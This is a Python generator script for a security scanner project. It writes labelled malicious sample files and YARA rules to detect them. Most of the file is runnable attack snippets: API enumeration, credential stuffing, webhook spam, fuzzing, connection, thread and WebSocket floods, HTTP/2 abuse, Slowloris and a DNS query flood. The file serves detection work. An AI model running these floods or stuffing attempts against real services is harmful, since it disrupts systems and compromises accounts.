#!/usr/bin/env python3
"""
Week 3 Resource Exhaustion 样本生成器
加速模式 - 批量创建剩余样本
"""

import os
import json
from datetime import datetime

SAMPLE_DIR = "/home/cdy/.openclaw/workspace/agent-security-skill-scanner-master/samples/malicious/resource_exhaustion"
RULES_DIR = "/home/cdy/.openclaw/workspace/agent-security-skill-scanner-master/rules/yara"

# 确保目录存在
os.makedirs(SAMPLE_DIR, exist_ok=True)
os.makedirs(RULES_DIR, exist_ok=True)

# Week 3 Day 1: Token 消耗样本 (8 个) - ✅ 已创建，跳过
# Week 3 Day 2: API 滥用样本 (8 个)
api_abuse_samples = [
    """# API Rate Limit Bypass - Sample 1
import requests
import time

def api_abuse():
    urls = [
        "https://api.example.com/data",
        "https://api.example.com/query",
        "https://api.example.com/search"
    ]
    for url in urls:
        for i in range(1000):
            requests.get(f"{url}?page={i}")
            time.sleep(0.001)

if __name__ == "__main__":
    api_abuse()
""",
    """# API Enumeration Attack - Sample 2
def enumerate_api():
    for user_id in range(100000):
        response = requests.get(f"https://api.target.com/user/{user_id}")
        if response.status_code == 200:
            print(f"Found user: {user_id}")
            with open("users.txt", "a") as f:
                f.write(f"{user_id}\\n")

enumerate_api()
""",
    """# API GraphQL Deep Query - Sample 3
query = '''
{
  users {
    id
    name
    email
    posts {
      id
      title
      content
      comments {
        id
        text
        author {
          name
          email
        }
      }
    }
  }
}
'''
response = requests.post("https://api.example.com/graphql", json={"query": query})
""",
    """# API Webhook Spam - Sample 4
def webhook_spam():
    webhook_url = "https://hooks.target.com/trigger"
    for i in range(10000):
        payload = {"event": "test", "data": f"spam_{i}"}
        requests.post(webhook_url, json=payload)
        
webhook_spam()
""",
    """# API Credential Stuffing - Sample 5
def credential_stuffing():
    credentials = [
        ("admin", "password123"),
        ("user", "123456"),
        ("test", "test123")
    ]
    for username, password in credentials:
        response = requests.post(
            "https://api.example.com/login",
            json={"username": username, "password": password}
        )
        if response.status_code == 200:
            print(f"Success: {username}")
            
credential_stuffing()
""",
    """# API Fuzzing Attack - Sample 6
import random
import string

def api_fuzzing():
    endpoints = ["/admin", "/api", "/v1", "/v2", "/debug", "/config"]
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    
    for _ in range(10000):
        endpoint = random.choice(endpoints)
        method = random.choice(methods)
        params = ''.join(random.choices(string.ascii_letters, k=100))
        
        try:
            requests.request(method, f"https://api.target.com{endpoint}?{params}")
        except:
            pass
            
api_fuzzing()
""",
    """# API Subscription Abuse - Sample 7
def subscription_abuse():
    emails = [f"test{i}@tempmail.com" for i in range(1000)]
    for email in emails:
        requests.post(
            "https://api.example.com/subscribe",
            json={"email": email, "plan": "premium_trial"}
        )
        
subscription_abuse()
""",
    """# API Batch Request Flood - Sample 8
def batch_flood():
    batch_url = "https://api.example.com/batch"
    for batch_num in range(1000):
        batch_data = {
            "requests": [
                {"method": "GET", "url": f"/resource/{i}"}
                for i in range(100)
            ]
        }
        requests.post(batch_url, json=batch_data)
        
batch_flood()
"""
]

# Week 3 Day 3: 并发攻击样本 (7 个)
concurrent_attack_samples = [
    """# Concurrent Connection Flood - Sample 1
import asyncio
import aiohttp

async def flood_session(session, url):
    async with session.get(url) as response:
        return await response.text()

async def concurrent_flood():
    url = "https://target.com/api"
    async with aiohttp.ClientSession() as session:
        tasks = [flood_session(session, url) for _ in range(10000)]
        await asyncio.gather(*tasks)

asyncio.run(concurrent_flood())
""",
    """# Thread Pool Exhaustion - Sample 2
from concurrent.futures import ThreadPoolExecutor
import requests

def exhaust_threads():
    def make_request(i):
        return requests.get("https://target.com/api")
    
    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(make_request, i) for i in range(10000)]
        for future in futures:
            future.result()

exhaust_threads()
""",
    """# WebSocket Connection Flood - Sample 3
import asyncio
import websockets

async def ws_flood():
    uri = "ws://target.com/socket"
    connections = []
    for i in range(1000):
        try:
            ws = await websockets.connect(uri)
            connections.append(ws)
            await ws.send(f"spam_{i}")
        except:
            pass
    
    for ws in connections:
        await ws.close()

asyncio.run(ws_flood())
""",
    """# HTTP/2 Stream Multiplexing Abuse - Sample 4
import httpx
import asyncio

async def http2_abuse():
    async with httpx.AsyncClient(http2=True) as client:
        url = "https://target.com/api"
        tasks = [client.get(url) for _ in range(5000)]
        responses = await asyncio.gather(*tasks)
        print(f"Completed: {len(responses)} requests")

asyncio.run(http2_abuse())
""",
    """# DNS Amplification - Sample 5
import socket
import struct

def dns_amplification():
    dns_server = "8.8.8.8"
    target_domain = "example.com"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    for i in range(10000):
        query = build_dns_query(target_domain)
        sock.sendto(query, (dns_server, 53))
    
    sock.close()

def build_dns_query(domain):
    transaction_id = struct.pack("!H", 0x1234)
    flags = struct.pack("!H", 0x0100)
    questions = struct.pack("!H", 1)
    answer_rrs = struct.pack("!H", 0)
    authority_rrs = struct.pack("!H", 0)
    additional_rrs = struct.pack("!H", 0)
    
    query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    for part in domain.split("."):
        query += struct.pack("B", len(part)) + part.encode()
    query += b"\\x00"
    query += struct.pack("!H", 1) + struct.pack("!H", 1)
    
    return query

dns_amplification()
""",
    """# Slowloris Attack - Sample 6
import socket
import threading
import time

def slowloris_attack():
    target = "target.com"
    port = 80
    
    def send_slow_headers():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.send(b"GET / HTTP/1.1\\r\\n")
        
        while True:
            sock.send(b"X-a: b\\r\\n")
            time.sleep(15)
    
    threads = []
    for i in range(1000):
        t = threading.Thread(target=send_slow_headers)
        t.start()
        threads.append(t)

slowloris_attack()
""",
    """# Connection Pool Exhaustion - Sample 7
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def exhaust_connection_pool():
    session = requests.Session()
    retry = Retry(total=10, connect=10, read=10)
    adapter = HTTPAdapter(pool_connections=1000, pool_maxsize=1000, max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    url = "https://target.com/api"
    for i in range(10000):
        try:
            session.get(url, timeout=0.1)
        except:
            pass

exhaust_connection_pool()
"""
]

# Week 3 Day 4: YARA 规则 (7 条)
yara_rules = [
    """rule ResourceExhaustion_API_Abuse {
    meta:
        description = "Detects API abuse patterns"
        severity = "medium"
        week = 3
        day = 4
    
    strings:
        $api_loop = /for\\s+\\w+\\s+in\\s+range\\s*\\(\\s*\\d{3,}\\s*\\)/
        $api_request = /requests\\.(get|post|put|delete)\\s*\\(/
        $api_url = /https?:\\/\\/[\\w.-]+\\/api/
    
    condition:
        $api_loop and $api_request and $api_url
}""",
    """rule ResourceExhaustion_Concurrent_Flood {
    meta:
        description = "Detects concurrent connection flood attacks"
        severity = "high"
        week = 3
        day = 4
    
    strings:
        $async = /async\\s+def|asyncio|await/
        $loop = /for\\s+.*\\s+in\\s+range\\s*\\(\\s*\\d{4,}\\s*\\)/
        $connection = /session\\.get|client\\.get|connect\\s*\\(/
    
    condition:
        $async and $loop and $connection
}""",
    """rule ResourceExhaustion_WebSocket_Flood {
    meta:
        description = "Detects WebSocket flood attacks"
        severity = "high"
        week = 3
        day = 4
    
    strings:
        $ws_import = /import\\s+websockets|from\\s+websockets/
        $ws_connect = /websockets\\.connect|ws\\.connect/
        $ws_loop = /for\\s+.*\\s+in\\s+range\\s*\\(\\s*\\d{3,}\\s*\\)/
    
    condition:
        $ws_import and $ws_connect and $ws_loop
}""",
    """rule ResourceExhaustion_Thread_Pool {
    meta:
        description = "Detects thread pool exhaustion attacks"
        severity = "high"
        week = 3
        day = 4
    
    strings:
        $thread_import = /ThreadPoolExecutor|threading\\.Thread/
        $thread_submit = /submit\\s*\\(|Thread\\s*\\(\\s*target/
        $large_count = /\\d{3,}\\s*\\)|max_workers\\s*=\\s*\\d{3,}/
    
    condition:
        $thread_import and $thread_submit and $large_count
}""",
    """rule ResourceExhaustion_DNS_Amplification {
    meta:
        description = "Detects DNS amplification attack patterns"
        severity = "critical"
        week = 3
        day = 4
    
    strings:
        $dns_socket = /socket\\.(AF_INET|SOCK_DGRAM)/
        $dns_send = /sendto\\s*\\(/
        $dns_port = /53/
        $dns_loop = /for\\s+.*\\s+in\\s+range\\s*\\(\\s*\\d{4,}\\s*\\)/
    
    condition:
        $dns_socket and $dns_send and $dns_port and $dns_loop
}""",
    """rule ResourceExhaustion_Slowloris {
    meta:
        description = "Detects Slowloris attack patterns"
        severity = "critical"
        week = 3
        day = 4
    
    strings:
        $http_request = /GET\\s+\\/\\s+HTTP\\/1\\.1/
        $slow_headers = /X-a:\\s*b|while\\s+True:/
        $sleep = /time\\.sleep\\s*\\(\\s*\\d{2,}\\s*\\)/
        $socket_connect = /socket\\.connect|sock\\.connect/
    
    condition:
        $http_request and $slow_headers and $sleep and $socket_connect
}""",
    """rule ResourceExhaustion_HTTP2_Abuse {
    meta:
        description = "Detects HTTP/2 stream multiplexing abuse"
        severity = "medium"
        week = 3
        day = 4
    
    strings:
        $http2 = /http2=True|HTTP\\/2|httpx.*http2/
        $gather = /asyncio\\.gather|asyncio\\.as_completed/
        $bulk_request = /client\\.(get|post)\\s*\\(.*for.*in.*range/
    
    condition:
        $http2 and $gather and $bulk_request
}"""
]

def create_samples():
    print("🚀 Week 3 样本生成开始...")
    
    # Day 2: API 滥用样本
    print("\n📝 Day 2: 创建 API 滥用样本 (8 个)...")
    for i, sample in enumerate(api_abuse_samples, start=7):
        filepath = os.path.join(SAMPLE_DIR, f"api_abuse_{i:03d}.txt")
        with open(filepath, "w") as f:
            f.write(f"# Resource Exhaustion - API Abuse Sample {i}\n")
            f.write(f"# Created: {datetime.now().isoformat()}\n")
            f.write(f"# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query\n\n")
            f.write(sample)
        print(f"  ✅ {filepath}")
    
    # Day 3: 并发攻击样本
    print("\n📝 Day 3: 创建并发攻击样本 (7 个)...")
    for i, sample in enumerate(concurrent_attack_samples, start=7):
        filepath = os.path.join(SAMPLE_DIR, f"concurrent_attack_{i:03d}.txt")
        with open(filepath, "w") as f:
            f.write(f"# Resource Exhaustion - Concurrent Attack Sample {i}\n")
            f.write(f"# Created: {datetime.now().isoformat()}\n")
            f.write(f"# Type: Connection Flood / Thread Exhaustion / WebSocket Flood\n\n")
            f.write(sample)
        print(f"  ✅ {filepath}")
    
    # Day 4: YARA 规则
    print("\n📝 Day 4: 创建 YARA 规则 (7 条)...")
    for i, rule in enumerate(yara_rules, start=1):
        filepath = os.path.join(RULES_DIR, f"resource_exhaustion_week3_rule_{i:02d}.yar")
        with open(filepath, "w") as f:
            f.write(f"// Resource Exhaustion Detection Rules - Week 3\n")
            f.write(f"// Created: {datetime.now().isoformat()}\n\n")
            f.write(rule)
        print(f"  ✅ {filepath}")
    
    print("\n✅ Week 3 样本生成完成!")
    print(f"   - API 滥用样本：8 个")
    print(f"   - 并发攻击样本：7 个")
    print(f"   - YARA 规则：7 条")

if __name__ == "__main__":
    create_samples()
